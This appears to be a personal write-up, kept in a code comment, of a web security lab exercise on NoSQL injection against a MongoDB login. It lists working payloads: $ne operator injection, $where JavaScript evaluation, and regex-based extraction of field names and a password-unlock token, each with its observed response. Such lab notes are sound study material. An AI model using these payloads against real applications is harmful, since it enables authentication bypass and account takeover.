/*

a reset token (from a url or some mechnism) allows us to set new password

a) we probably need to extract the reset token field from mongodb

1) Login wrong creds

{"username":"carlos","password":"fdfd"}

// Invalid username or password

{"username":"carlos","password":{"$ne":""}}
// account locked please reset password
// means that $ne was injected successfully


2) {"username":"carlos","password":{"$ne":""},"$where":"0"}
// Invalid username or password

{"username":"carlos","password":{"$ne":""},"$where":"1"}
// account locked please reset password

so the JS in the where clause is being evaluated 

3) guessing the token parameter using regex match

send to intruder
{
"username":"carlos","password":{"$ne":""},
"$where":"Object.keys(this)[0].match('^.{§§}§§.*')"
}

// id parameter

{
"username":"carlos","password":{"$ne":""},
"$where":"Object.keys(this)[1].match('^.{§§}§§.*')"
}

// username parameter

{
"username":"carlos","password":{"$ne":""},
"$where":"Object.keys(this)[2].match('^.{§§}§§.*')"
}

// password parameter

{
"username":"carlos","password":{"$ne":""},
"$where":"Object.keys(this)[3].match('^.{§§}§§.*')"
}

// unlockToken parameter

4) intrude the reset token value
{
"username":"carlos","password":{"$ne":""},
"$where":"this.unlockToken.match('^.{§§}§§.*')"
}

// unlockToken = 

5) GET /forgot-password?unlockToken=795fbcd63aa81ac4 HTTP/2


*/